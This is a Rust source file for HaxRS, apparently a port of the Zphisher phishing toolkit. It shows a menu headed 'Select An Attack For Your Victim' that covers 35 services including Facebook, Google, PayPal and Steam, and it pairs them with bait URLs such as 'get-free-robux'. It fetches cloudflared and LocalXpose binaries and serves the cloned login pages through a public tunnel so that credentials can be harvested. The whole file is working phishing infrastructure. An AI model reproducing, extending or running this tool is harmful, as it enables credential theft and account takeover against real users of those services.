use crate::cli::{clear_terminal, error_msg, log_msg};
use crate::constants::*;
use crate::helpers::{files_exist, get_cloudflare_file, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};

use colored::Colorize;
use std::{env, thread};
use std::env::consts::{ARCH, OS};

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{exit, Command, Stdio};
use crate::constants::USER_AGENT;

use reqwest::{header, Url};
use std::fs::{File, OpenOptions, remove_file};
use std::io::{stdin, stdout, Write};
use regex::Regex;
//#[cfg(target_os = "windows")] use std::thread::sleep;
// #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
// use rayon::prelude::*; use regex::Regex;
use zip::read::ZipFile;
use zip::ZipArchive;
use crate::errors::TerminalError;
use crate::web_server::start_webserver;


pub fn setup_directories() {
    let base_dir = match get_data_dir() {
        Some(e) => e.join("zphisher"),
        None => {
            log::error!("{}", "Failed to get home directory".red());
            error_msg("Failed to get home directory");
            exit(1);
        }
    };

    create_dir_if_not_exists(&base_dir.join(".server"));
    create_dir_if_not_exists(&base_dir.join("auth"));
    // create_dir_if_not_exists(&base_dir.join(".server/www"));
    remove_file_if_exists(&base_dir.join(".server/.loclx"));
    remove_file_if_exists(&base_dir.join(".server/.cld.log"));
}

fn handle_error<T, E: std::fmt::Display>(result: Result<T, E>, error_msg_: &str) {
    match result {
        Ok(_) => {}
        Err(e) => {
            log::error!("{}", e);
            error_msg(&format!("{}: {}", error_msg_, e));
            exit(1);
        }
    }
}

fn create_dir_if_not_exists(dir: &Path) {
    if !dir.exists() {
        handle_error(fs::create_dir_all(dir), "Failed to create directory");
    }
}

/*
fn recreate_dir(dir: &Path) {
    if dir.exists() {
        handle_error(fs::remove_dir_all(dir), "Failed to remove directory");
    }
    handle_error(fs::create_dir_all(dir), "Failed to create directory");
}
*/

fn remove_file_if_exists(file: &Path) {
    if file.exists() {
        handle_error(remove_file(file), "Failed to remove file");
    }
}

pub fn banner() {
    const BANNER: &str = r#"
     ______      _     _     _
    |___  /     | |   (_)   | |
       / / _ __ | |__  _ ___| |__   ___ _ __
      / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
     / /__| |_) | | | | \__ \ | | |  __/ |
    /_____| .__/|_| |_|_|___/_| |_|\___|_|
          | |
          |_|
"#;
    println!("{}", BANNER.bright_red());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
    println!();
}

pub fn banner_small() {
    const BANNER: &str = r#"
░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀
"#;
    println!("{}", BANNER.cyan());
    println!("HaxRS Version: {}", VERSION.bold());
    println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
    println!();
}

#[cfg(target_os = "windows")]
pub fn kill_pid() {
    log::info!("Killing processes");
    use sysinfo::{ProcessExt, System, SystemExt};
    let processes_to_kill = [
        "php.exe",
        "cloudflared-windows-amd64.exe",
        "loclx.exe",
        "cloudflared-windows-386.exe",
    ];
    let mut sys = System::new_all();

    // We refresh the list of processes.
    sys.refresh_processes();

    for (pid, proc) in sys.processes() {
        if processes_to_kill.contains(&proc.name()) {
            // Kill the process by PID
            if let Err(e) = Command::new("taskkill").arg("/PID").arg(pid.to_string()).arg("/F").output() {
                log::error!("Failed to kill process {}: {}", pid, e);
                error_msg(&format!("Failed to kill process {}: {}", pid, e));
            }
        }
    }
}

#[cfg(target_os = "linux")]
pub fn kill_pid() {
    let processes_to_kill = ["php", "cloudflared", "loclx"];
    let procs = match procfs::process::all_processes() {
        Ok(p) => p,
        Err(e) => {
            error_msg(&format!("Failed to get processes: {}", e));
            return;
        }
    };

    for proc in procs {
        if let Ok(cmd) = {
            match proc {
                Ok(ref a) => a,
                Err(e) => {
                    log::error!("Failed to get process: {}", e);
                    error_msg(&format!("Failed to get process: {}", e));
                    continue;
                }
            }
        }.cmdline() {
            if let Some(process_name) = cmd.get(0) {
                if processes_to_kill.contains(&process_name.as_str()) {
                    if let Err(e) = nix::sys::signal::kill(
                        nix::unistd::Pid::from_raw({
                            match proc {
                                Ok(v) => v,
                                Err(e) => {
                                    log::error!("Failed to get process: {}", e);
                                    error_msg(&format!("Failed to get process: {}", e));
                                    continue;
                                }
                            }.pid
                        } as i32),
                        nix::sys::signal::Signal::SIGKILL,
                    ) {
                        log::error!("Failed to kill process: {}", e);
                        error_msg(&format!("Failed to kill process: {}", e));
                    }
                }
            }
        }
    }
}


async fn download(url: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    // check in the url if its a loclx file

    let filename: &str = url.split('/').last().unwrap_or("tmp.bin");
    dbg!(&filename);
    let file_name = if filename.contains("loclx") {
        match OS {
            "windows" => "loclx.exe",
            "linux" => "loclx",
            _ => "loclx",
        }
    } else {
        filename
    };
    dbg!(&file_name);


    log::info!("Downloading {} to {}", url, file_name);

    let target_path = match get_server_dir() {
        Some(path) => path.join(
            {
                if !path.join(file_name).exists() {
                    if file_name.contains("loclx") {
                        match OS {
                            "windows" => "loclx-windows-amd64.zip",
                            "linux" => {
                                match ARCH {
                                    "x86_64" => "loclx-linux-amd64.zip",
                                    "aarch64" => "loclx-linux-arm64.zip",
                                    _ => "loclx-linux-amd64.zip",
                                }
                            }
                            _ => {
                                log::error!("Unsupported OS at download function");
                                error_msg("Unsupported OS at download function");
                                exit(1);
                            }
                        }
                    } else {
                        file_name
                    }
                } else {
                    file_name
                }
            }),
        None => Path::new(file_name).to_path_buf(),
    };

    let file_extension: &str = target_path.extension().unwrap_or_default().to_str().unwrap_or_default();
    dbg!(&file_extension);
    log::info!("Target path(download function): {:?}", target_path);

    if !target_path.exists() {
        log::info!("Target path (Raw installation): {:?}", target_path);
        let mut headers = header::HeaderMap::new();
        headers.insert(header::USER_AGENT, header::HeaderValue::from_static(USER_AGENT));
        headers.insert(header::ACCEPT, header::HeaderValue::from_static("application/json"));
        headers.insert(header::ACCEPT_ENCODING, header::HeaderValue::from_static("gzip, deflate, br"));
        headers.insert(header::ACCEPT_LANGUAGE, header::HeaderValue::from_static("en-US,en;q=0.9"));
        headers.insert(header::CACHE_CONTROL, header::HeaderValue::from_static("no-cache"));
        headers.insert(header::CONNECTION, header::HeaderValue::from_static("keep-alive"));
        headers.insert(header::PRAGMA, header::HeaderValue::from_static("no-cache"));
        headers.insert(header::CONTENT_TYPE, header::HeaderValue::from_static("application/x-www-form-urlencoded"));
        // Download the file
        let client = reqwest::ClientBuilder::new()
            .default_headers(headers)
            .cookie_store(true);
        let response = client.build()?.get(Url::parse(url)?).send().await?;
        log::info!("HTTP Status: {:?}", response.status());
        if response.status() != 200 {
            return Err("Failed to download file".into());
        }
        let mut file = File::create(&target_path)?;
        file.write_all(response.bytes().await?.as_ref())?;

        // response.copy_to(&mut file)?;

        log::info!("File extension: {}", file_extension);
        log::info!("File name: {}", file_name);
        log::info!("Target path: {:?}", target_path);

        // Handle different file types
        let mut out_path = PathBuf::new();

        match file_extension {
            "exe" => {
                out_path = target_path;
            }
            "zip" => {
                let file = File::open(&target_path)?;
                let mut archive: ZipArchive<File> = match ZipArchive::new(file) {
                    Ok(v) => v,
                    Err(e) => {
                        log::error!("Failed to open zip archive: {}", e);
                        error_msg(&format!("Failed to open zip archive: {}", e));
                        return Err(e.into());
                    }
                };
                for i in 0..archive.len() {
                    let mut file: ZipFile = archive.by_index(i)?;

                    out_path = match get_server_dir() {
                        Some(path) => path.join({
                            match file.enclosed_name() {
                                Some(path) => path.to_owned(),
                                None => continue,
                            }
                        }),
                        None => continue,
                    };

                    let mut outfile = OpenOptions::new().create_new(true).write(true).append(true).open(&out_path)?;

                    std::io::copy(&mut file, &mut outfile)?;
                }
                remove_file(target_path)?;
            }
            #[cfg(target_os = "linux")]
            "tgz" => {
                let tar_gz = File::open(file_name)?;
                let tar = flate2::read::GzDecoder::new(tar_gz);
                let mut archive = tar::Archive::new(tar);
                archive.unpack(&target_path)?;
            }
            #[cfg(target_os = "windows")]
            _ => {
                log::error!("Unknown file type: {}", file_extension);
                error_msg(&format!("Unknown file type: {}", file_extension));
                return Err("Unknown file type".into());
            }

            #[cfg(not(target_os = "windows"))]
            _ => {
                out_path = target_path;
            }
        }
        log::info!("Outpath: {:?}", out_path);
        return Ok(out_path);
    } else {
        log::info!("File {} already exists, skipping download.", target_path.display());
    }
    Ok(target_path)
}

pub async fn install_dependencies() {
    log::info!("Checking dependencies");
    log_msg("Checking for dependencies... (installing them, if they don't exist)");

    let exe_path = match env::current_exe() {
        Ok(e) => e,
        Err(e) => {
            log::error!("Failed to get current executable path: {}", e);
            error_msg(&format!("Failed to get current executable path: {}", e));
            return;
        }
    };

    let bin_path = get_server_dir().unwrap_or(
        {
            match exe_path.parent() {
                Some(p) => p.to_path_buf(),
                None => {
                    log::error!("Failed to get current executable path");
                    error_msg("Failed to get current executable path");
                    return;
                }
            }
        }.join(BIN_PATH),
    );

    let download_links: [&str; 2] = get_download_urls();
    if files_exist(&bin_path) {
        return;
    }
    for download_link in &download_links {
        /*
        #[cfg(not(target_os = "windows"))] let bin_path = match exe_path.parent() {
            Some(p) => p.join(get_server_dir().unwrap_or(BIN_PATH.into())), // Join "bin" directory here.
            None => {
                log::error!("Failed to get current executable path");
                error_msg("Failed to get current executable path");
                return;
            }
        };*/

        log::info!("Bin Path (S281): {:?}", bin_path);

        if !bin_path.exists() {
            if let Err(e) = fs::create_dir(&bin_path) {
                log::error!("Failed to create 'bin' directory: {}", e);
                error_msg(&format!("Failed to create 'bin' directory: {}", e));
                return;
            }
        }

        match download(download_link).await {
            Ok(p) => {
                log::info!("Downloaded {}", p.display());
                #[cfg(target_os = "windows")]
                if let Err(e) = Command::new("powershell").arg("-Command").arg("Start-Process").arg(&p).arg("-ArgumentList").arg("service").arg("install").arg("-Verb").arg("RunAs").output() {
                    log::error!("Failed to install {}: {e}", p.display());
                    error_msg(&format!("Failed to install {}: {e}", p.display()));
                }

                #[cfg(not(target_os = "windows"))]
                if let Err(e) = Command::new("chmod").arg("+x").arg(&p).output() {
                    log::error!("Failed to give execute permissions to {}: {e}", p.display());
                    error_msg(&format!(
                        "Failed to give execute permissions to {}: {e}",
                        p.display()
                    ));
                }
            }
            Err(e) => {
                log::error!("Failed to download(E310): {}", e);
                error_msg(&format!("Failed to download(E310): {}", e));
            }
        }
    };
}

pub fn custom_port_input() -> Result<Option<u16>, TerminalError> {
    loop {
        print!("{}{}", "Enter Your Custom 4-digit Port [1024-9999] (empty = 8080) : ".cyan(), String::new().white());
        stdout().flush()?;
        let mut selection = String::new();
        stdin().read_line(&mut selection)?;
        selection = selection.trim().to_string();
        return if selection.is_empty() {
            Ok(None)
        } else {
            // turn this into a match statement
            let num: u16 = match selection.parse::<u16>() {
                Ok(s) => s,
                Err(_) => {
                    log::error!("Not a number");
                    error_msg("Not a number");
                    continue;
                }
            };
            if !(1024..=9999).contains(&num) {
                log::error!("Not in range");
                error_msg("Not in range");
                continue;
            }
            Ok(Some(num))
        };
    }
}

pub fn site_input() -> Result<u16, TerminalError> {
    loop {
        print!("{}{}", "Select a site: ".cyan(), String::new().white());
        stdout().flush()?;
        let mut selection = String::new();
        stdin().read_line(&mut selection)?;
        selection = selection.trim().to_string();
        if selection.is_empty() {
            log::error!("Empty input");
            error_msg("Empty input");
        } else {
            let num: u16 = match selection.parse::<u16>() {
                Ok(s) => s,
                Err(_) => {
                    log::error!("Not a number or out of range");
                    error_msg("Not a number or out of range");
                    continue;
                }
            };
            return Ok(num);
        }
    }
}


pub fn site_selection<'a>() -> (&'a str, Option<&'a str>, Option<&'a str>) {
    loop {
        let selection = match site_input() {
            Ok(s) => s,
            Err(e) => {
                log::error!("Failed to get site input: {}", e);
                error_msg(&format!("Failed to get site input: {}", e));
                return ("", None, None);
            }
        };
        match selection {
            1 => return ("facebook", None, Some("https://www.facebook.com/")),
            2 => return ("instagram", None, Some("https://www.instagram.com/")),
            3 => return ("google", None, Some("https://www.google.com/")),
            4 => return ("microsoft", Some("https://unlimited-onedrive-space-for-free"), Some("https://www.microsoft.com/")),
            5 => return ("netflix", Some("https://upgrade-your-netflix-plan-free"), Some("https://www.netflix.com/")),
            6 => return ("paypal", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.paypal.com/")),
            7 => return ("steam", Some("https://steam-500-usd-gift-card-free"), Some("https://store.steampowered.com/")),
            8 => return ("twitter", Some("https://get-blue-badge-on-twitter-free"), Some("https://twitter.com/")),
            9 => return ("playstation", Some("https://playstation-500-usd-gift-card-free"), Some("https://www.playstation.com/")),
            10 => return ("tiktok", Some("https://tiktok-free-liker"), Some("https://www.tiktok.com/")),
            11 => return ("twitch", Some("https://unlimited-twitch-tv-user-for-free"), Some("https://www.twitch.tv/")),
            12 => return ("pinterest", Some("https://get-a-premium-plan-for-pinterest-free"), Some("https://www.pinterest.com/")),
            13 => return ("snapchat", Some("https://view-locked-snapchat-accounts-secretly"), Some("https://www.snapchat.com/")),
            14 => return ("linkedin", Some("https://get-a-premium-plan-for-linkedin-free"), Some("https://www.linkedin.com/")),
            15 => return ("ebay", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.ebay.com/")),
            16 => return ("quora", Some("https://quora-premium-for-free"), Some("https://www.quora.com/")),
            17 => return ("protonmail", Some("https://protonmail-pro-basics-for-free"), Some("https://protonmail.com/")),
            18 => return ("spotify", Some("https://convert-your-account-to-spotify-premium"), Some("https://www.spotify.com/")),
            19 => return ("reddit", Some("https://reddit-official-verified-member-badge"), Some("https://www.reddit.com/")),
            20 => return ("adobe", Some("https://get-adobe-lifetime-pro-membership-free"), Some("https://www.adobe.com/")),
            21 => return ("deviantart", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.deviantart.com/")),
            22 => return ("badoo", Some("https://get-500-usd-free-to-your-acount"), Some("https://badoo.com/")),
            23 => return ("origin", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.origin.com/")),
            24 => return ("dropbox", Some("https://get-1TB-cloud-storage-free"), Some("https://www.dropbox.com/")),
            25 => return ("yahoo", Some("https://grab-mail-from-anyother-yahoo-account-free"), Some("https://www.yahoo.com/")),
            26 => return ("wordpress", Some("https://unlimited-wordpress-traffic-free"), Some("https://wordpress.com/")),
            27 => return ("yandex", Some("https://grab-mail-from-anyother-yandex-account-free"), Some("https://yandex.com/")),
            28 => return ("stackoverflow", Some("https://get-stackoverflow-lifetime-pro-membership-free"), Some("https://stackoverflow.com/")),
            29 => return ("vk", None, Some("https://vk.com/")),
            30 => return ("xbox", Some("https://get-500-usd-free-to-your-acount"), Some("https://www.xbox.com/")),
            31 => return ("mediafire", Some("https://get-1TB-on-mediafire-free"), Some("https://www.mediafire.com/")),
            32 => return ("gitlab", Some("https://get-1k-followers-on-gitlab-free"), Some("https://gitlab.com/")),
            33 => return ("github", Some("https://get-1k-followers-on-github-free"), Some("https://github.com/")),
            34 => return ("discord", Some("https://get-discord-nitro-free"), Some("https://discord.com/")),
            35 => return ("roblox", Some("https://get-free-robux"), Some("https://www.roblox.com/")),
            99 => return ("about", None, None),
            0 => return ("exit", None, None),
            _ => {
                log::error!("Invalid selection");
                error_msg("Invalid selection, Please try again");
            }
        }
    }
}


pub async fn start_localhost(site: &str, redirect_url: String) -> Result<(), TerminalError> {
    let custom_port: Option<u16> = custom_port_input()?;
    log::info!("Starting localhost on port {}", custom_port.unwrap_or(PORT));
    println!("{} ({})", "Initializing...".green(), format!("http://{0}:{1}", HOST, custom_port.unwrap_or(PORT)).cyan());

    setup_site(site, custom_port, redirect_url).await?;
    Ok(())
}

pub async fn tunnel_menu(site: &str, redirect_url: String) -> Result<(), TerminalError> {
    clear_terminal()?;
    banner_small();
    println!("Selected: {}\n", site.to_uppercase().cyan());
    let servers = [
        ("01", "Localhost", None),
        ("02", "Cloudflared", Some("Auto Detects")),
        ("03", "LocalXpose", Some("NEW! Max 15Min")),
    ];

    for (id, server, note) in servers {
        let colorized_id = format!("[{}]", id).red();
        let colorized_server = server.truecolor(255, 165, 0);
        match note {
            Some(note) => println!("{} {} [{}]", colorized_id, colorized_server, note.cyan()),
            None => println!("{} {}", colorized_id, colorized_server),
        }
    }

    println!();
    tunnel_selection(site, redirect_url).await?;

    Ok(())
}


pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
    loop {
        print!("{}", msg);
        stdout().flush()?;

        let mut input = String::new();
        stdin().read_line(&mut input)?;

        match input.trim().parse::<u32>() {
            Ok(val) => return Ok(val),
            Err(_) => {
                log::error!("Invalid input");
                error_msg("Invalid input");
                // continue the loop
            }
        }
    }
}

pub async fn tunnel_selection(site: &str, redirect_url: String) -> Result<(), TerminalError> {
    loop {
        let selection: u32 = get_input_number("Select a tunnel: ")?;
        match selection {
            1 => return start_localhost(site, redirect_url).await,
            2 => return start_cloudflared(site, redirect_url).await,
            3 => {
                error_msg("Not implemented yet");
                continue;
            }
            _ => {
                log::error!("Invalid selection");
                error_msg("Invalid selection, Please try again");
                continue;
            }
        }
    }
}


pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> Result<(), TerminalError> {
    log::info!("Setting up site");
    println!("{} {}", "Setting up server...".green(), "Please wait".cyan());
    // change into .server directory
    let sites_dir = get_sites_dir().unwrap_or_else(|| {
        log::error!("Failed to get sites directory");
        error_msg("Failed to get sites directory");
        exit(1);
    });
    let site_dir = sites_dir.join(site);
    // dbg!(&sites_dir);
    // dbg!(&site_dir);
    start_webserver(site_dir, port, redirect_url).await?;
    Ok(())
}


fn get_cldflr_url(cus_port: Option<u16>) -> Result<String, TerminalError> {
    dbg!("start");

    let output = Command::new("powershell").arg("-Command").arg(get_cloudflare_file()).arg("tunnel").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log").arg("--http2-origin").stdout(Stdio::null()).stderr(Stdio::inherit()).spawn().expect("Failed to start cloudflared");

    let raw_output = output.wait_with_output()?;
    let output = String::from_utf8_lossy(&raw_output.stderr);
    dbg!(&output);

    let url_regex = Regex::new(r"https://[-0-9a-z]*\.trycloudflare.com").unwrap();

    for line in output.lines() {
        if let Some(captures) = url_regex.captures(line) {
            return Ok(captures[0].to_string());
        }
    }
    dbg!(&output);

    Err("URL not found".into())
}


pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), TerminalError> {
    // remove ".cld.log" file if exists
    let cld_log = match get_server_dir() {
        Some(s) => s,
        None => {
            log::error!("Failed to get server directory");
            error_msg("Failed to get server directory");
            return Err("Failed to get server directory".into());
        }
    }.join(".cld.log");

    if cld_log.exists() {
        match remove_file(&cld_log) {
            Ok(_) => {}
            Err(e) => {
                log::error!("Failed to remove .cld.log file: {}", e);
                error_msg(&format!("Failed to remove .cld.log file: {}", e));
                return Err(e.into());
            }
        }
    }
    let cus_port: Option<u16> = custom_port_input()?;
    // start setup site with the scope down below at the same time


    thread::spawn(move || {
        println!("{}", get_cldflr_url(cus_port).unwrap_or_else(|e| {
            log::error!("Failed to get cloudflared URL: {}", e);
            error_msg(&format!("Failed to get cloudflared URL: {}", e));
            exit(1);
        }));
    });
    setup_site(site, cus_port, redirect_url).await?;

    #[cfg(not(target_os = "windows"))]
    {
        let cloudflare_file = match ARCH {
            "x86_64" => "cloudflared-linux-amd64",
            "aarch64" => "cloudflared-linux-arm64",
            _ => {
                log::error!("Unsupported architecture: {}", ARCH);
                error_msg(&format!("Unsupported architecture: {}", ARCH));
                return Err("Unsupported architecture".into());
            }
        };
        let mut cmd = Command::new(cloudflare_file);
        cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log");
    }

    Ok(())
}

pub async fn main_menu() -> Result<(), TerminalError> {
    clear_terminal()?;
    banner();
    let services: [(&str, (u8, u8, u8)); 35] = [
        ("Facebook", (66, 103, 178)), ("Instagram", (225, 48, 108)), ("Google", (66, 133, 244)), ("Microsoft", (43, 87, 151)),
        ("Netflix", (229, 9, 20)), ("Paypal", (0, 123, 182)), ("Steam", (100, 100, 100)), ("Twitter", (29, 161, 242)),
        ("Playstation", (0, 104, 182)), ("Tiktok", (44, 140, 231)), ("Twitch", (145, 70, 255)), ("Pinterest", (189, 8, 28)),
        ("Snapchat", (255, 252, 0)), ("Linkedin", (0, 119, 181)), ("Ebay", (186, 23, 34)), ("Quora", (185, 43, 39)),
        ("Protonmail", (84, 172, 210)), ("Spotify", (29, 185, 84)), ("Reddit", (255, 87, 0)), ("Adobe", (237, 23, 43)),
        ("DeviantArt", (5, 150, 105)), ("Badoo", (230, 74, 25)), ("Origin", (244, 67, 54)), ("DropBox", (0, 126, 229)),
        ("Yahoo", (150, 0, 155)), ("Wordpress", (33, 117, 155)), ("Yandex", (213, 0, 0)), ("StackOverflow", (244, 67, 54)),
        ("Vk", (76, 118, 176)), ("XBOX", (16, 124, 16)), ("Mediafire", (49, 80, 195)), ("Gitlab", (233, 30, 99)),
        ("Github", (100, 100, 100)), ("Discord", (114, 137, 218)), ("Roblox", (226, 35, 26)),
    ];

    println!("{} {} {}\n", "[::]".red(), "Select An Attack For Your Victim".bright_blue(), "[::]".red());

    for (i, (service, color)) in services.iter().enumerate() {
        let id = format!("{:2}", i + 1);
        let colorized_service = service.truecolor(color.0, color.1, color.2);
        print!("{}) {:<15} ", id.red(), colorized_service);
        if (i + 1) % 3 == 0 {
            println!();
        }
    }

    // If the number of services is not a multiple of 3, we need to print a new line
    if services.len() % 3 != 0 {
        println!();
    }

    println!("{}) {:<15} ", "99".red(), "About".bright_blue());
    println!("{}) {:<15} ", "0".red(), "Exit".bright_blue());
    println!();
    let sel: (&str, Option<&str>, Option<&str>) = site_selection();
    if sel.1.is_some() || sel.2.is_some() {
        tunnel_menu(sel.0, sel.2.unwrap_or("").to_string()).await?;
    }
    // println!("signaled: {0} | {1}", sel.0, sel.1.unwrap_or("None"));
    Ok(())
}

// TODO: Add User Agent to File.
// TODO: Add LocalXPose Auth.
// TODO: Add Start with LocalXPose.
// TODO: Add URL shortener/masking.
// TODO: Add checks for file download!!!!
